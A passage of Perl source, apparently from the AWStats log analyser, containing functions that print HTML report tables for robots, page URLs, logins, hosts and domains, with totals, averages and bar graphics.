						${ '_section_' . $extranum . '_l' }{$key}
						? Format_Date(
							${ '_section_' . $extranum . '_l' }{$key}, 1 )
						: '-'
					  )
					  . "</td>";
				}
				print "</tr>\n";
				$count++;
			}

			# If we ask average or sum, we loop on all other records
			if (   $ExtraAddAverageRow[$extranum]
				|| $ExtraAddSumRow[$extranum] )
			{
				foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
					if ( $keysinkeylist{$_} ) { next; }
					$total_p += ${ '_section_' . $extranum . '_p' }{$_};
					$total_h += ${ '_section_' . $extranum . '_h' }{$_};
					$total_k += ${ '_section_' . $extranum . '_k' }{$_};
					$count++;
				}
			}

			# Add average row
			if ( $ExtraAddAverageRow[$extranum] ) {
				print "<tr>";
				print "<td class=\"aws\"><b>" . _t("Average") . "</b></td>";
				if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
					print "<td>"
					  . ( $count ? Format_Number(( $total_p / $count )) : "&nbsp;" )
					  . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
					print "<td>"
					  . ( $count ? Format_Number(( $total_h / $count )) : "&nbsp;" )
					  . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
					print "<td>"
					  . (
						$count
						? Format_Bytes( $total_k / $count )
						: "&nbsp;"
					  )
					  . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
					print "<td>&nbsp;</td>";
				}
				print "</tr>\n";
			}

			# Add sum row
			if ( $ExtraAddSumRow[$extranum] ) {
				print "<tr>";
				print "<td class=\"aws\"><b>" . _t("Sum") . "</b></td>";
				if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
					print "<td>" . ($total_p) . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
					print "<td>" . ($total_h) . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
					print "<td>" . Format_Bytes($total_k) . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
					print "<td>&nbsp;</td>";
				}
				print "</tr>\n";
			}
			&tab_end();
			&html_end(1);
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Prints the Robot details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowRobots{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $total_r = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	my $rest_r = 0;
	
	print "$Center<a name=\"robots\">&nbsp;</a><br />\n";
	my $title = '';
	if ( $HTMLOutput{'allrobots'} )  { $title .= _t("Robots"); }
	if ( $HTMLOutput{'lastrobots'} ) { $title .= _t("Last"); }
	&tab_head( "$title", 19, 0, 'robots' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>"
	  . Format_Number(( scalar keys %_robot_h ))
	  . " " . _t("Different robots") . "</th>";
	if ( $ShowRobotsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ShowRobotsStats =~ /B/i ) {
		print
"<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowRobotsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	$total_p = $total_h = $total_k = $total_r = 0;
	my $count = 0;
	if ( $HTMLOutput{'allrobots'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},
			\%_robot_h, \%_robot_h );
	}
	if ( $HTMLOutput{'lastrobots'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},
			\%_robot_h, \%_robot_l );
	}
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">"
		  . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )
		  . "</td>";
		if ( $ShowRobotsStats =~ /H/i ) {
			print "<td>"
			  . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))
			  . ( $_robot_r{$key} ? "+$_robot_r{$key}" : "" ) . "</td>";
		}
		if ( $ShowRobotsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_robot_k{$key} ) . "</td>";
		}
		if ( $ShowRobotsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_robot_l{$key}
				? Format_Date( $_robot_l{$key}, 1 )
				: '-'
			  )
			  . "</td>";
		}
		print "</tr>\n";

		#$total_p += $_robot_p{$key}||0;
		$total_h += $_robot_h{$key};
		$total_k += $_robot_k{$key} || 0;
		$total_r += $_robot_r{$key} || 0;
		$count++;
	}

	# For bots we need to count Totals
	my $TotalPagesRobots =
	  0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }
	my $TotalHitsRobots = 0;
	foreach ( values %_robot_h ) { $TotalHitsRobots += $_; }
	my $TotalBytesRobots = 0;
	foreach ( values %_robot_k ) { $TotalBytesRobots += $_; }
	my $TotalRRobots = 0;
	foreach ( values %_robot_r ) { $TotalRRobots += $_; }
	$rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;
	$rest_h = $TotalHitsRobots - $total_h;
	$rest_k = $TotalBytesRobots - $total_k;
	$rest_r = $TotalRRobots - $total_r;

	if ($Debug) {
		debug(
"Total real / shown : $TotalPagesRobots / $total_p - $TotalHitsRobots / $total_h - $TotalBytesRobots / $total_k",
			2
		);
	}
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )
	{               # All other robots
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		if ( $ShowRobotsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
		if ( $ShowRobotsStats =~ /B/i ) {
			print "<td>" . ( Format_Bytes($rest_k) ) . "</td>";
		}
		if ( $ShowRobotsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end(
		"* " . _t("Hits on robots.txt") . ( $TotalRRobots ? " " . _t("Total") : "" ) );
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the URL, Entry or Exit details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowURLDetail{
	my $total_p = 0;
	my $total_e = 0;
	my $total_k = 0;
	my $total_x = 0;
	# Call to plugins' function ShowPagesFilter
	foreach
	  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesFilter'} } )
	{
		my $function = "ShowPagesFilter_$pluginname";
		&$function();
	}
	print "$Center<a name=\"urls\">&nbsp;</a><br />\n";

	# Show filter form
	&HTMLShowFormFilter( "urlfilter", $FilterIn{'url'}, $FilterEx{'url'} );

	# Show URL list
	my $title = '';
	my $cpt   = 0;
	if ( $HTMLOutput{'urldetail'} ) {
		$title = _t("Viewed pages");
		$cpt   = ( scalar keys %_url_p );
	}
	if ( $HTMLOutput{'urlentry'} ) {
		$title = _t("Entry");
		$cpt   = ( scalar keys %_url_e );
	}
	if ( $HTMLOutput{'urlexit'} ) {
		$title = _t("Exit");
		$cpt   = ( scalar keys %_url_x );
	}
	&tab_head( "$title", 19, 0, 'urls' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
	if ( $FilterIn{'url'} || $FilterEx{'url'} ) {
		if ( $FilterIn{'url'} ) {
			print _t("Filter") . " <b>$FilterIn{'url'}</b>";
		}
		if ( $FilterIn{'url'} && $FilterEx{'url'} ) { print " - "; }
		if ( $FilterEx{'url'} ) {
			print _t("Exclude filter") . " <b>$FilterEx{'url'}</b>";
		}
		if ( $FilterIn{'url'} || $FilterEx{'url'} ) { print ": "; }
		print Format_Number($cpt)." " . _t("Different pages");
		if ( $MonthRequired ne 'all' ) {
			if ( $HTMLOutput{'urldetail'} ) {
				print
"<br />" . _t("Total") . ": ".Format_Number($TotalDifferentPages)." " . _t("Different pages");
			}
		}
	}
	else { print _t("Total") . ": ".Format_Number($cpt)." " . _t("Different pages"); }
	print "</th>";
	if ( $ShowPagesStats =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>";
	}
	if ( $ShowPagesStats =~ /B/i ) {
		print
"<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>";
	}
	if ( $ShowPagesStats =~ /E/i ) {
		print
		  "<th bgcolor=\"#$color_e\" width=\"80\">" . _t("Entry") . "</th>";
	}
	if ( $ShowPagesStats =~ /X/i ) {
		print
		  "<th bgcolor=\"#$color_x\" width=\"80\">" . _t("Exit") . "</th>";
	}

	# Call to plugins' function ShowPagesAddField
	foreach
	  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
	{

		#    			my $function="ShowPagesAddField_$pluginname('title')";
		#    			eval("$function");
		my $function = "ShowPagesAddField_$pluginname";
		&$function('title');
	}
	print "<th>&nbsp;</th></tr>\n";
	$total_p = $total_k = $total_e = $total_x = 0;
	my $count = 0;
	if ( $HTMLOutput{'urlentry'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_e,
			\%_url_e );
	}
	elsif ( $HTMLOutput{'urlexit'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_x,
			\%_url_x );
	}
	else {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_p,
			\%_url_p );
	}
	my $max_p = 1;
	my $max_k = 1;
	foreach my $key (@keylist) {
		if ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }
		if ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {
			$max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );
		}
	}
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">";
		&HTMLShowURLInfo($key);
		print "</td>";
		my $bredde_p = 0;
		my $bredde_e = 0;
		my $bredde_x = 0;
		my $bredde_k = 0;
		if ( $max_p > 0 ) {
			$bredde_p =
			  int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }
		if ( $max_p > 0 ) {
			$bredde_e =
			  int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }
		if ( $max_p > 0 ) {
			$bredde_x =
			  int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }
		if ( $max_k > 0 ) {
			$bredde_k =
			  int( $BarWidth *
				  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
				  $max_k ) + 1;
		}
		if ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }
		if ( $ShowPagesStats =~ /P/i ) {
			print "<td>".Format_Number($_url_p{$key})."</td>";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<td>"
			  . (
				$_url_k{$key}
				? Format_Bytes(
					$_url_k{$key} / ( $_url_p{$key} || 1 )
				  )
				: "&nbsp;"
			  )
			  . "</td>";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<td>"
			  . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<td>"
			  . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : "&nbsp;" ) . "</td>";
		}

		# Call to plugins' function ShowPagesAddField
		foreach my $pluginname (
			keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
		{

		  #    				my $function="ShowPagesAddField_$pluginname('$key')";
		  #    				eval("$function");
			my $function = "ShowPagesAddField_$pluginname";
			&$function($key);
		}
		print "<td class=\"aws\">";

		# alt and title are not provided to reduce page size
		if ( $ShowPagesStats =~ /P/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"4\" /><br />";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"4\" /><br />";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'he'}\" width=\"$bredde_e\" height=\"4\" /><br />";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hx'}\" width=\"$bredde_x\" height=\"4\" />";
		}
		print "</td></tr>\n";
		$total_p += $_url_p{$key};
		$total_e += $_url_e{$key};
		$total_x += $_url_x{$key};
		$total_k += $_url_k{$key};
		$count++;
	}
	if ($Debug) {
		debug(
"Total real / shown : $TotalPages / $total_p - $TotalEntries / $total_e - $TotalExits / $total_x - $TotalBytesPages / $total_k",
			2
		);
	}
	my $rest_p = $TotalPages - $total_p;
	my $rest_k = $TotalBytesPages - $total_k;
	my $rest_e = $TotalEntries - $total_e;
	my $rest_x = $TotalExits - $total_x;
	if ( $rest_p > 0 || $rest_e > 0 || $rest_k > 0 ) {
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		if ( $ShowPagesStats =~ /P/i ) {
			print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<td>"
			  . (
				$rest_k
				? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
				: "&nbsp;"
			  )
			  . "</td>";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<td>" . ( $rest_e ? Format_Number($rest_e) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<td>" . ( $rest_x ? Format_Number($rest_x) : "&nbsp;" ) . "</td>";
		}

		# Call to plugins' function ShowPagesAddField
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
		{
			my $function = "ShowPagesAddField_$pluginname";
			&$function('');
		}
		print "<td>&nbsp;</td></tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Login details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowLogins{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	print "$Center<a name=\"logins\">&nbsp;</a><br />\n";
	my $title = '';
	if ( $HTMLOutput{'alllogins'} )  { $title .= _t("Login"); }
	if ( $HTMLOutput{'lastlogins'} ) { $title .= _t("Last"); }
	&tab_head( "$title", 19, 0, 'logins' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Login") . " : "
	  . Format_Number(( scalar keys %_login_h )) . "</th>";
	&HTMLShowUserInfo('__title__');
	if ( $ShowAuthenticatedUsers =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>";
	}
	if ( $ShowAuthenticatedUsers =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ShowAuthenticatedUsers =~ /B/i ) {
		print
"<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowAuthenticatedUsers =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	$total_p = $total_h = $total_k = 0;
	my $count = 0;
	if ( $HTMLOutput{'alllogins'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},
			\%_login_h, \%_login_p );
	}
	if ( $HTMLOutput{'lastlogins'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},
			\%_login_h, \%_login_l );
	}
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">$key</td>";
		&HTMLShowUserInfo($key);
		if ( $ShowAuthenticatedUsers =~ /P/i ) {
			print "<td>"
			  . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : "&nbsp;" )
			  . "</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /H/i ) {
			print "<td>".Format_Number($_login_h{$key})."</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /B/i ) {
			print "<td>" . Format_Bytes( $_login_k{$key} ) . "</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /L/i ) {
			print "<td>"
			  . (
				$_login_l{$key}
				? Format_Date( $_login_l{$key}, 1 )
				: '-'
			  )
			  . "</td>";
		}
		print "</tr>\n";
		$total_p += $_login_p{$key} || 0;
		$total_h += $_login_h{$key};
		$total_k += $_login_k{$key} || 0;
		$count++;
	}
	if ($Debug) {
		debug(
"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h",
			2
		);
	}
	$rest_p = $TotalPages - $total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
	{    # All other logins and/or anonymous
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Anonymous") . "</span></td>";
		&HTMLShowUserInfo('');
		if ( $ShowAuthenticatedUsers =~ /P/i ) {
			print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /H/i ) {
			print "<td>".Format_Number($rest_h)."</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>";
		}
		if ( $ShowAuthenticatedUsers =~ /L/i ) {
			print "<td>&nbsp;</td>";
		}
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Unknown IP/Host details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowHostsUnknown{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	print "$Center<a name=\"unknownip\">&nbsp;</a><br />\n";
	&tab_head( _t("Unresolved IP Address"), 19, 0, 'unknownwip' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>"
	  . Format_Number(( scalar keys %_host_h ))
	  . " " . _t("Unresolved IP Address") . "</th>";
	&HTMLShowHostInfo('__title__');
	if ( $ShowHostsStats =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>";
	}
	if ( $ShowHostsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ShowHostsStats =~ /B/i ) {
		print
"<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowHostsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	$total_p = $total_h = $total_k = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
		\%_host_p );
	foreach my $key (@keylist) {
		my $host = CleanXSS($key);
		print "<tr><td class=\"aws\">$host</td>";
		&HTMLShowHostInfo($key);
		if ( $ShowHostsStats =~ /P/i ) {
			print "<td>"
			  . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : "&nbsp;" )
			  . "</td>";
		}
		if ( $ShowHostsStats =~ /H/i ) {
			print "<td>".Format_Number($_host_h{$key})."</td>";
		}
		if ( $ShowHostsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_host_k{$key} ) . "</td>";
		}
		if ( $ShowHostsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_host_l{$key}
				? Format_Date( $_host_l{$key}, 1 )
				: '-'
			  )
			  . "</td>";
		}
		print "</tr>\n";
		$total_p += $_host_p{$key};
		$total_h += $_host_h{$key};
		$total_k += $_host_k{$key} || 0;
		$count++;
	}
	if ($Debug) {
		debug(
"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h",
			2
		);
	}
	$rest_p = $TotalPages - $total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
	{    # All other visitors (known or not)
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		&HTMLShowHostInfo('');
		if ( $ShowHostsStats =~ /P/i ) {
			print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
		if ( $ShowHostsStats =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>";
		}
		if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Host details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowHosts{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	my $title = '';
	print "$Center<a name=\"hosts\">&nbsp;</a><br />\n";

	# Show filter form
	&HTMLShowFormFilter( "hostfilter", $FilterIn{'host'},
		$FilterEx{'host'} );

	# Show hosts list
	my $cpt   = 0;
	if ( $HTMLOutput{'allhosts'} ) {
		$title .= _t("Visitors");
		$cpt = ( scalar keys %_host_h );
	}
	if ( $HTMLOutput{'lasthosts'} ) {
		$title .= _t("Last");
		$cpt = ( scalar keys %_host_h );
	}
	&tab_head( "$title", 19, 0, 'hosts' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
	if ( $FilterIn{'host'} || $FilterEx{'host'} ) {    # With filter
		if ( $FilterIn{'host'} ) {
			print _t("Filter") . " '<b>$FilterIn{'host'}</b>'";
		}
		if ( $FilterIn{'host'} && $FilterEx{'host'} ) { print " - "; }
		if ( $FilterEx{'host'} ) {
			print _t("Exclude filter") . " '<b>$FilterEx{'host'}</b>'";
		}
		if ( $FilterIn{'host'} || $FilterEx{'host'} ) { print ": "; }
		print "$cpt " . _t("Visitors");
		if ( $MonthRequired ne 'all' ) {
			if ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {
				print
"<br />" . _t("Total") . ": ".Format_Number($TotalHostsKnown)." " . _t("Known") . ", ".Format_Number($TotalHostsUnknown)." " . _t("Unknown") . " - ".Format_Number($TotalUnique)." " . _t("Unique visitors");
			}
		}
	}
	else {    # Without filter
		if ( $MonthRequired ne 'all' ) {
			print
_t("Total") . " : ".Format_Number($TotalHostsKnown)." " . _t("Known") . ", ".Format_Number($TotalHostsUnknown)." " . _t("Unknown") . " - ".Format_Number($TotalUnique)." " . _t("Unique visitors");
		}
		else { print _t("Total") . " : " . Format_Number(( scalar keys %_host_h )); }
	}
	print "</th>";
	&HTMLShowHostInfo('__title__');
	if ( $ShowHostsStats =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>";
	}
	if ( $ShowHostsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ShowHostsStats =~ /B/i ) {
		print
"<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowHostsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	$total_p = $total_h = $total_k = 0;
	my $count = 0;
	if ( $HTMLOutput{'allhosts'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
			\%_host_p );
	}
	if ( $HTMLOutput{'lasthosts'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h,
			\%_host_l );
	}
	my $regipv4=qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;

	if ( $DynamicDNSLookup == 2 ) {
		# Use static DNS file
		&Read_DNS_Cache( \%MyDNSTable, "$DNSStaticCacheFile", "", 1 );
	}

	foreach my $key (@keylist) {
		my $host = CleanXSS($key);
		print "<tr><td class=\"aws\">"
		  . ( $_robot_l{$key} ? '<b>'  : '' ) . "$host"
		  . ( $_robot_l{$key} ? '</b>' : '' );

		if ($DynamicDNSLookup) {
			# Dynamic reverse DNS lookup
        	        if ($host =~ /$regipv4/o) {
                	        my $lookupresult=lc(gethostbyaddr(pack("C4",split(/\./,$host)),AF_INET));       # This may be slow
                        	if (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {
					if ( $DynamicDNSLookup == 2 ) {
						# Check static DNS file
						$lookupresult = $MyDNSTable{$host};
						if ($lookupresult) { print " ($lookupresult)"; }
						else { print ""; }
					}
					else { print ""; }
	                        }
        	                else { print " ($lookupresult)"; }
	                }
		}

		print "</td>";
		&HTMLShowHostInfo($key);
		if ( $ShowHostsStats =~ /P/i ) {
			print "<td>"
			  . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : "&nbsp;" )
			  . "</td>";
		}
		if ( $ShowHostsStats =~ /H/i ) {
			print "<td>".Format_Number($_host_h{$key})."</td>";
		}
		if ( $ShowHostsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_host_k{$key} ) . "</td>";
		}
		if ( $ShowHostsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_host_l{$key}
				? Format_Date( $_host_l{$key}, 1 )
				: '-'
			  )
			  . "</td>";
		}
		print "</tr>\n";
		$total_p += $_host_p{$key};
		$total_h += $_host_h{$key};
		$total_k += $_host_k{$key} || 0;
		$count++;
	}
	if ($Debug) {
		debug(
"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h",
			2
		);
	}
	$rest_p = $TotalPages - $total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
	{    # All other visitors (known or not)
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		&HTMLShowHostInfo('');
		if ( $ShowHostsStats =~ /P/i ) {
			print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
		if ( $ShowHostsStats =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>";
		}
		if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Domains details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowDomains{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $total_v = 0;
	my $total_u = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	my $rest_v = 0;
	my $rest_u = 0;
	print "$Center<a name=\"domains\">&nbsp;</a><br />\n";

	# Show domains list
	my $title = '';
	my $cpt   = 0;
	if ( $HTMLOutput{'alldomains'} ) {
		$title .= _t("Countries");
		$cpt = ( scalar keys %_domener_h );
	}
	&tab_head( "$title", 19, 0, 'domains' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th colspan=\"2\">" . _t("Domain") . "</th>";
	if ( $ShowDomainsStats =~ /U/i ) {
		print
		  "<th bgcolor=\"#$color_u\" width=\"80\">" . _t("Unique visitors") . "</th>";
	}
	if ( $ShowDomainsStats =~ /V/i ) {
		print
		  "<th bgcolor=\"#$color_v\" width=\"80\">" . _t("Visits") . "</th>";
	}
	if ( $ShowDomainsStats =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>";
	}
	if ( $ShowDomainsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ShowDomainsStats =~ /B/i ) {
		print
"<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
	}
	print "<th>&nbsp;</th>";
	print "</tr>\n";
	$total_u = $total_v = $total_p = $total_h = $total_k = 0;
	my $max_h = 1;
	foreach ( values %_domener_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	my $max_k = 1;
	foreach ( values %_domener_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_domener_h,
		\%_domener_p );
	foreach my $key (@keylist) {
		my ( $_domener_u, $_domener_v );
		my $bredde_p = 0;
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_h > 0 ) {
			$bredde_p =
			  int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;
		}    # use max_h to enable to compare pages with hits
		if ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }
		if ( $max_h > 0 ) {
			$bredde_h =
			  int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;
